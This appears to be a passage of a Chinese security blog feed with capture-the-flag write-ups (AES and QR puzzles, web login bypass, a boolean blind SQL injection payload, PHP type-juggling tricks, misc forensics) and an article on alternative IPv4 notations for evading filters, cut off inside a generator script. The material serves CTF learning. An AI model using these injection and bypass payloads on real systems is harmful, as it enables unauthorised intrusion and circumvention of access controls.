        <content type="html"><![CDATA[<h4 id="中二的成长之路"><a href="#中二的成长之路" class="headerlink" title="中二的成长之路"></a>中二的成长之路</h4><blockquote><p>我用真心对你，你却用QR敷衍我。</p><p><a href="http://xman.xctf.org.cn/media/task/6704c696-0a81-4715-b16c-38a093dadedf.jpg" target="_blank" rel="noopener">附件下载</a></p><p><img src="QR.jpg" alt="QR"></p><ul><li>试试QR的哈希，并且注意红字。</li><li>使用图片显示的某些信息做哈希</li><li>再次观察图片，看看不一样的颜色和字体，也许需要做一下哈希</li></ul></blockquote><ul><li>扫描题目给的图片得到<code>3ukka4wZf2Q9H8PEI5YKFA==</code> ，但直接base64解码得到乱码。谷歌搜索发现可能性很多，各种尝试无果。</li><li>使用binwalk分离出压缩包。不是伪加密，爆破也无果。</li><li>经过主办方提示<code>看看不一样的颜色和字体</code> 注意到AES，搜索发现与今年9月份的问鼎杯CTF一道题极为相似，就是压缩包的密码经过AES加密后再进行base64编码。这样就有了基本的思路。但还缺少一些信息，比如AES采用哪种模式，key是什么，如果有IV，又会是什么。</li><li>对着三次关于<code>哈希</code> 的提示，猜想做出来的哈希就是key，那么就不需要IV，那么就可能是ECB或CTR模式。但哈希是对谁做的呢，产生了很多联想，做了一些尝试无果。后来猛然发现，基本上能用来产生哈希用于AES加密并产生BASE64串的东西一定是在图片生成之前就存在。那么可能性就不多了，甚至没有了。比赛快结束前注意到<code>试试QR的哈希</code> 这一提示，不报什么希望地试了下字符串”QR”的哈希，没想到成了。解密后得到压缩包密码<code>1Znmpr4jzChwxXqB</code> 。</li><li>打开压缩包后迎面而来又一张QR，解出<code>bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=</code> 。很容易想到这是要故技重施，又要找一串key。因为key可能是16、24或32字节，很自然想到上一次解密就试过的16个字节的文件名<code>s776051080zum92N</code> ，一试便成，得到<code>XCTF{W0W_U_G0T_TH3_FL4G}</code> 。</li><li>勉强拿到门票，即将和大佬们一起学习，有点兴奋：）</li></ul><p>附上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64,hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = hashlib.md5(<span class="string">'QR'</span>).hexdigest()</span><br><span class="line">secret=<span class="string">"3ukka4wZf2Q9H8PEI5YKFA=="</span> <span class="comment"># 图片扫码结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc)</span>:</span></span><br><span class="line">  aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(enc)</span><br><span class="line">res=decrypt(base64.b64decode(secret))</span><br><span class="line"><span class="keyword">print</span> len(res),res</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line">key = <span class="string">"s776051080zum92N"</span> <span class="comment">#压缩包里面图片的文件名</span></span><br><span class="line">secret=<span class="string">"bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so="</span> <span class="comment">#压缩包里图片是涨二维码，扫出来这个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt2</span><span class="params">(enc)</span>:</span></span><br><span class="line">  aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(enc)</span><br><span class="line">res=decrypt2(base64.b64decode(secret))</span><br><span class="line"><span class="keyword">print</span> len(res),res</span><br><span class="line"><span class="comment">#------运行结果--------------</span></span><br><span class="line"><span class="comment">#16 1Znmpr4jzChwxXqB</span></span><br><span class="line"><span class="comment">#32 XCTF&#123;W0W_U_G0T_TH3_FL4G&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>第二届美亚柏科邀请赛</title>
      <link href="/171223MeiyaCTFWP/"/>
      <url>/171223MeiyaCTFWP/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h4><blockquote><p>Flag在哪里?</p><p>链    接 <a href="http://10sBB7f7sSo9.isec.anscen.cn" target="_blank" rel="noopener">http://10sBB7f7sSo9.isec.anscen.cn</a></p></blockquote><p>burp抓包后向login.php常规 post <code>user[]=admin&amp;pass[]=a&amp;submit=submit</code>  。 得到<code>flag{7538a033d41f442cbae9578d4c189615}</code>  。</p><h4 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h4><blockquote><p>你找得到Flag吗？</p><p>链    接<a href="http://3jhg9aks3.isec.anscen.cn" target="_blank" rel="noopener">http://3jhg9aks3.isec.anscen.cn</a></p></blockquote><ul><li>fuzz发现某些响应包头部会多出<code>Set-Cookie: remind=U1FMSQ%3D%3D;</code> 字样，依此进行布尔型盲注。</li><li>使用intruder的<code>Cluster Bomb</code> 模式自动化，攻击向量为<code>content=b&#39;||substr((select/**/hex(database())),$1$,1)=&#39;$6$&#39;#</code> </li><li>处理得到flag</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">r=<span class="string">'p'</span>+<span class="string">'x'</span>*<span class="number">100</span></span><br><span class="line">r=[i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line"></span><br><span class="line">c0=[<span class="number">32</span>,<span class="number">42</span>]<span class="comment"># 表示数据的第32，42位是'0'</span></span><br><span class="line">c1=[<span class="number">6</span>,<span class="number">18</span>,<span class="number">30</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">76</span>]</span><br><span class="line">c2=[<span class="number">40</span>,<span class="number">60</span>]</span><br><span class="line">c3=[<span class="number">11</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">33</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">57</span>,<span class="number">61</span>,<span class="number">65</span>,<span class="number">67</span>,<span class="number">73</span>,<span class="number">74</span>,<span class="number">75</span>]</span><br><span class="line">c4=[<span class="number">14</span>,<span class="number">20</span>,<span class="number">56</span>]</span><br><span class="line">c5=[<span class="number">16</span>,<span class="number">28</span>,<span class="number">36</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">68</span>]</span><br><span class="line">c6=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">27</span>,<span class="number">29</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">69</span>,<span class="number">71</span>]</span><br><span class="line">c7=[<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">62</span>,<span class="number">77</span>]</span><br><span class="line">c8=[<span class="number">26</span>,<span class="number">50</span>,<span class="number">58</span>]</span><br><span class="line">c9=[<span class="number">34</span>,<span class="number">66</span>]</span><br><span class="line">ca=[]</span><br><span class="line">cb=[<span class="number">10</span>]<span class="comment"># 表示数据的第10位是'b'</span></span><br><span class="line">cc=[<span class="number">4</span>]</span><br><span class="line">cd=[<span class="number">78</span>]</span><br><span class="line">ce=[]</span><br><span class="line">cf=[]</span><br><span class="line"></span><br><span class="line">call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(call)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> call[i]:</span><br><span class="line">r[j]=hex(i)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(r)</span><br><span class="line"><span class="comment">#666c61677b3764356164363738656130393533623036356538376364386237663935616133317d</span></span><br><span class="line"><span class="comment">#flag&#123;7d5ad678ea0953b065e87cd8b7f95aa31&#125;</span></span><br></pre></td></tr></table></figure><ul><li>题外话：使用hex()编码待查询数据再进行注入会把数据长度增长一倍，但待选字符集大小将减少到十六个，对于像本题这样没法二分的情况很高效。对于可以二分查找的情况复杂度和直接注入是一样的，还可以避开不可见字符的干扰。</li></ul><h4 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h4><blockquote><p>还没找到flag么</p><p>链    接<a href="http://8ah3ka0akj.isec.anscen.cn" target="_blank" rel="noopener">http://8ah3ka0akj.isec.anscen.cn</a></p></blockquote><p>查看源码，循序渐进。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">view-source:<span class="comment">//http://8ah3ka0akj.isec.anscen.cn/?key1=php://input&amp;key2=skwerl11&amp;key3=665.99999999999999&amp;key4=99999999999999999999999999999999999999</span></span><br><span class="line">post Hello hacker!</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">Hello hacker! <span class="keyword">Do</span> you want the flag?&lt;br&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($k1)===<span class="string">"Hello hacker!"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'welcome! Hacker!&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj</span><br><span class="line">welcome! Hacker!&lt;br&gt;&lt;!--</span><br><span class="line"><span class="keyword">if</span>(md5($k2)&gt;<span class="number">666666</span>*<span class="number">666666</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'ctf.php'</span>); </span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">Come on, flag is coming&lt;br&gt;flag&#123;<span class="number">0</span>fd14555a5d275b253aff1bae158ca7c&#125;&lt;!--</span><br><span class="line">$k3=$_GET[<span class="string">'key3'</span>];</span><br><span class="line">$k4=$_GET[<span class="string">'key4'</span>];</span><br><span class="line"><span class="keyword">if</span>(intval($k3)&lt;<span class="number">666</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($k3==<span class="number">666</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Come on, flag is coming&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($k4&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(intval($k3+$k4)&lt;<span class="number">666</span>)</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC4"><a href="#MISC4" class="headerlink" title="MISC4"></a>MISC4</h4><blockquote><p>到底什么才是打开flag的正确姿势？</p><p>链    接<a href="http://1e3g6S39v5M9.isec.anscen.cn" target="_blank" rel="noopener">http://1e3g6S39v5M9.isec.anscen.cn</a></p></blockquote><p>解压<code>Misc_Flow.rar</code> 得到<code>flag.rar</code> 和<code>Hints.txt</code> 两个文件，其中<code>hint.txt</code> 提示<code>Blasting code???No No No!There is another txt file.</code> ，尝试用<code>alternatestreamview.exe</code> 扫描文件夹，得到隐藏的流文件<code>:password.txt:$DATA</code> ，提取出内容是<code>c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad</code> 。</p><p>发现<code>flag.rar</code> 无法作为压缩包打开，修复文件头为正确的<code>52617221</code> 后将上面字符串作为密码即可打开，得到包含flag的图片。<code>flag{43cca4b3de2097b9558efefb0ecc3588}</code> </p><h4 id="MISC5"><a href="#MISC5" class="headerlink" title="MISC5"></a>MISC5</h4><blockquote><p>截获了一份敌军的流量包，据悉暗号就在里面</p><p>链    接<a href="http://2S8h7F84v4M0.isec.anscen.cn" target="_blank" rel="noopener">http://2S8h7F84v4M0.isec.anscen.cn</a></p></blockquote><p>过滤出ICMP包，按顺序排列，发现数据包长度可疑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">144</span>,<span class="number">150</span>,<span class="number">139</span>,<span class="number">145</span>,<span class="number">165</span>,<span class="number">91</span>,<span class="number">109</span>,<span class="number">151</span>,<span class="number">122</span>,<span class="number">113</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">93</span>,<span class="number">167</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(i<span class="number">-42</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a])</span><br><span class="line"><span class="comment"># flag&#123;1CmPG@M3&#125;</span></span><br></pre></td></tr></table></figure><h4 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC?"></a>MISC?</h4><blockquote><p>can’t see anything</p><p>什么也看不见</p></blockquote><p>感谢川大师傅提供思路。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">题图末尾有base32字符串</span><br><span class="linespan><br><span class="line">解码后得到</span><br><span class="line">P4000000N500100010000000006050O405103QS28895O011SR103QS28895O011SR103QS288193084P30081001000000000000200N0478747R27616P6660000000000000002000000000000004200800000006200000062O2NO8Q84O413Q79500800090004100S12010O40510N6Q0Q8Q039292535P025PP3Q39P4P82O3053R4Q4N4537343R4631343Q4P47O63SNP494OPO4478747R27616P666000000800000006200000062O2NO8Q84O413Q7950080000000414030O405</span><br><span class="line">将NOPQRS依次替换为ABCDEF得到十六进制串</span><br><span class="line">C4000000A500100010000000006050B405103DF28895B011FE103DF28895B011FE103DF288193084C30081001000000000000200A0478747E27616C6660000000000000002000000000000004200800000006200000062B2AB8D84B413D79500800090004100F12010B40510A6D0D8D039292535C025CC3D39C4C82B3053E4D4A4537343E4631343D4C47B63FAC494BCB4478747E27616C666000000800000006200000062B2AB8D84B413D7950080000000414030B405</span><br><span class="line">将字符串反序，得到<span class="number">504</span>B开头的字符串</span><br><span class="line"><span class="number">504</span>B0304140000000800597D314B48D8BA2B260000002600000008000000666C61672E7478744BCB494CAF36B74C4D3431364E3437354A4D4E3503B28C4C93D3CC520C535292930D8D0D6A01504B01021F00140009000800597D314B48D8BA2B2600000026000000080024000000000000002000000000000000666C61672E7478740A00200000000000010018003C480391882FD301EF110B59882FD301EF110B59882FD301504B050600000000010001005A0000004C</span><br><span class="line">使用十六进制编辑器保存为rar文件</span><br><span class="line">打开可见flag.txt文件</span><br><span class="line">flag&#123;<span class="number">79</span>ea433a752ece633a25cf6d1ddcc130&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>IP地址混淆</title>
      <link href="/171125TextualRepresentationOfIPAddress/"/>
      <url>/171125TextualRepresentationOfIPAddress/</url>
      
        <content type="html"><![CDATA[<p>不知有多少人了解IP地址<code>127.0.0.1</code> 一定程度上是完全等价于<code>127.1</code> 和<code>0x7f.1</code> 的，不过我从上回看到<code>ping 127.1</code> 能正常工作开始，就一直很好奇背后的原因，最近又在 <a href="http://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/">一个CTF题目</a> 用到基于IP表示法的技巧，于是决定稍微探索一下。</p><p>我发现一个IPv4地址可能拥有上百个不同的表示形式，而由于一些历史原因，在这方面的标准尚未完全统一，因此这些形式在大部分情况下都是可被正常解析的(举个例子，URL <a href="http://000000300.0x000000000a8.00102.00000000351" target="_blank" rel="noopener">http://000000300.0x000000000a8.00102.00000000351</a> 会解析成<a href="http://192.168.66.233/" target="_blank" rel="noopener">http://192.168.66.233/</a> )，这就在绕过限制和其他一些安全问题上提供了想象的空间。</p><p>本文主要介绍这些混淆背后的历史原因和原理，至于如何生成适用形式的IP也不复杂，并且常常需要考虑具体场景。不过我写了个小脚本，放在了<a href="https://github.com/findneo/IP-Obfuscator" target="_blank" rel="noopener">GitHub</a> 上，有需要可作为参考。</p><h3 id="关于IP和IPv4地址"><a href="#关于IP和IPv4地址" class="headerlink" title="关于IP和IPv4地址"></a>关于IP和IPv4地址</h3><p>IPv4是应用于分组交换网络的无状态协议，是网际协议(Internet Protocol , IP)的第四个版本，也是第一个投入生产的版本，1983年开始首先应用在ARPANET项目中。</p><p>IP地址用以标记使用IP接入网络的设备。IPv4把IP地址定义为32位二进制数，可表示 <code>2**32</code> 约42亿个网络设备接口，早期使用分类网络(Classful Addressing)的方法划分为五类，随着IP地址需求的增长，这种分类法被无类别域间路由(Classless Inter-Domain Routing , CIDR)取代。【参见RFC 1517-1519】</p><h3 id="IPv4-地址句法的历史与现状"><a href="#IPv4-地址句法的历史与现状" class="headerlink" title="IPv4 地址句法的历史与现状"></a>IPv4 地址句法的历史与现状</h3><p>一个IPv4地址除了被机器解析外，还会用在很多需要人类阅读理解的地方，而一个32位二进制数(如<code>11000000101010000100001011101001</code> )对人类是很不友好的，因此人们必然会需要某种文本描述(textual representation) 。我们现在最常见到的点分十进制表示法(dotted-decimal notation) 就是其一。什么是点分十进制呢？就是由点号分隔开的四个十进制数(如<code>192.168.66.233</code> ） ，其中每个十进制数表示一个字节(octets , 八位二进制数)，较高有效位在左，较低有效位在右。</p><p>尽管从上面的描述我们可以了解到IPv4地址的常见形式，但是关于IP地址的文本描述具体应该如何，似乎从来没有严谨全面的定义。另一方面，IP作为互联网中较为基础的设施之一，常常不可避免地出现在各种协议的描述里，这些描述有时顺带也会提及IP地址的写法，但提法不尽相同，也并不足够强硬和严谨。这篇 <a href="https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02" target="_blank" rel="noopener">文章</a> 细数了一些RFC文档里出现过的描述 ，可以看到不同场景下出现过<code>#127.0.0.1</code> 、<code>[127.0.0.1]</code> 、<code>127.000.000.001</code> 等形式的写法。</p><p>当IETF版本的句法处于无意识发展时，BSD版本的句法悄然登场。一个权威的解释大概也不是那么重要，尤其是当一项技术的某种实现已经被广泛使用。对于IPv4地址而言，这个实现就是<code>4.2BSD</code> 。 <code>4.2BSD</code> 引入了名为<code>inet_aton()</code> 的用于将字符串解释为IP地址的函数，这个函数被广泛地复制和演绎，从而使得BSD版本的关于IP地址文本描述的句法成为了事实上的标准——能够被<code>inet_aton()</code> 解释即合标准。至于<code>inet_aton()</code> 接受哪些形式的IP地址，将在下文给出。</p><p>这里先简要谈谈这两种句法的异同。</p><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><p>对于最大多数情况——不带前导0的点分十进制( <code>dotted decimal octets with leading zeroes suppressed</code> ) ，两者都是支持的。</p><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ul><li>BSD版本的许多句法IETF版本都不支持</li><li><strong><em>最重要的。</em></strong>IETF版本的句法在所有表述中始终如一地暗示要将带有前导0的数字解释为十进制，而BSD版本的句法在实现中将带有前导0的数字解释为八进制。举个例子，前者认为<code>192.168.1.011</code> 等价于<code>192.168.1.11</code> ，而后者认为等价于<code>192.168.1.9</code> 。</li></ul><p>值得一提的是IPv6 的发展也对此产生了一定的影响。IPv6中的函数<code>inet_pton()</code> 在处理IPv4地址时只接受点分十进制，并且明确地拒绝了一些能够被<code>inet_aton()</code> 接受的句法。然而，对于是否接受前导0语焉不详。</p><p>此外，2005年的RFC 3986 提出取两者安全的公共子集作为严格的IP地址句法定义，形成倾向于IETF的标准，但同时保持对BSD实现的后向兼容。这个子集的定义如下，简单说就是用点号分隔的四个十进制数，禁止使用前导0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A <span class="number">32</span>-bit IPv4 address <span class="keyword">is</span> divided into four octets.  Each octet <span class="keyword">is</span></span><br><span class="line">represented numerically <span class="keyword">in</span> decimal, using the minimum possible number</span><br><span class="line">of digits (leading zeroes are <span class="keyword">not</span> used, <span class="keyword">except</span> <span class="keyword">in</span> the case of <span class="number">0</span></span><br><span class="line">itself).  The four encoded octets are given most-significant first,</span><br><span class="line">separated by period characters.</span><br><span class="line"></span><br><span class="line">        IPv4address = d8 <span class="string">"."</span> d8 <span class="string">"."</span> d8 <span class="string">"."</span> d8</span><br><span class="line"></span><br><span class="line">        d8          = DIGIT               ; <span class="number">0</span><span class="number">-9</span></span><br><span class="line">                    / %x31<span class="number">-39</span> DIGIT       ; <span class="number">10</span><span class="number">-99</span></span><br><span class="line">                    / <span class="string">"1"</span> <span class="number">2</span>DIGIT          ; <span class="number">100</span><span class="number">-199</span></span><br><span class="line">                    / <span class="string">"2"</span> %x30<span class="number">-34</span> DIGIT   ; <span class="number">200</span><span class="number">-249</span></span><br><span class="line">                    / <span class="string">"25"</span> %x30<span class="number">-35</span>        ; <span class="number">250</span><span class="number">-255</span></span><br></pre></td></tr></table></figure><h3 id="inet-aton-允许哪些形式的IP地址"><a href="#inet-aton-允许哪些形式的IP地址" class="headerlink" title="inet_aton()允许哪些形式的IP地址"></a>inet_aton()允许哪些形式的IP地址</h3><ul><li>a single number giving the entire 32-bit address.</li><li>dot-separated octet values.  </li><li>It also interpreted two intermediate syntaxes: </li><li>octet-dot-octet-dot-16bits, intended for class B addresses</li><li>octet-dot-24bits, intended for class A addresses. </li><li>It also allowed some flexibility in how the individual numeric parts were specified. it allowed octal and hexadecimal in addition to decimal, distinguishing these radices by using the C language syntax involving a prefix “0” or “0x”, and allowed the numbers to be arbitrarily long.</li></ul><p>归纳起来有这么几种情况</p><ul><li>IP地址只有一个部分，表示为<code>a</code> ，每部分表示32位二进制数</li><li>IP地址有两个部分，表示为<code>a.b</code> ，<code>a</code> 表示8位二进制数，<code>b</code> 表示24位二进制数</li><li>IP地址有三部分，表示为<code>a.b.c</code> ，<code>a</code> 和<code>b</code> 各表示8位二进制数，<code>c</code> 表示16位二进制数</li><li>IP地址有四个部分，表示为<code>a.b.c.d</code> ，每部分表示8位二进制数</li></ul><p>以及这么两个重点</p><ul><li>每一个部分可以都有三种表示法，十进制、十六进制和八进制，用前缀表明进制。</li><li>每部分的数字可以是任意长度。（这意味着可以把<code>077</code> 和<code>0xff</code> 表示成<code>000000077</code> 和<code>0x00000ff</code> 等）</li></ul><p>到此为止，可以看到<code>127.1</code> 属于上述第二种情况，最开始的疑惑也就不复存在。</p><p>这应该算是一个历史遗留问题，不过在未来一段时间内，在广泛涉及URL和IP地址的浏览器和许多应用层程序(如Ping、telnet、wget、curl、GET、HEAD等)中，符合BSD版本句法的IPv4地址表示形式仍然是可接受的，而这些表示可以多达上百种，就可能在一些安全问题上发挥出人意料的作用。</p><h3 id="生成一个IP地址的上百种形式"><a href="#生成一个IP地址的上百种形式" class="headerlink" title="生成一个IP地址的上百种形式"></a>生成一个IP地址的上百种形式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref: https://linux.die.net/man/3/inet_aton</span></span><br><span class="line"><span class="comment">#      https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02</span></span><br><span class="line"><span class="comment">#      https://tools.ietf.org/html/rfc3986</span></span><br><span class="line"><span class="comment">#      http://www.linuxsa.org.au/pipermail/linuxsa/2007-September/088131.html</span></span><br><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> it</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">ip = <span class="string">'192.168.66.233'</span></span><br><span class="line">i = ip.split(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hex(int(x))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hi = [f(i[<span class="number">0</span>]),</span><br><span class="line">      f(i[<span class="number">1</span>]),</span><br><span class="line">      f(i[<span class="number">2</span>]),</span><br><span class="line">      f(i[<span class="number">3</span>]),</span><br><span class="line">      <span class="comment"># hi[4]:part c of "a.b.c"</span></span><br><span class="line">      f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</span><br><span class="line">      <span class="comment"># hi[5]:part b of "a.b"</span></span><br><span class="line">      f(i[<span class="number">1</span>]) + f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</span><br><span class="line">      <span class="comment"># hi[6]:'a'</span></span><br><span class="line">      f(i[<span class="number">0</span>]) + f(i[<span class="number">1</span>]) + f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</span><br><span class="line">      ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2oct</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">""" arbitrary length is 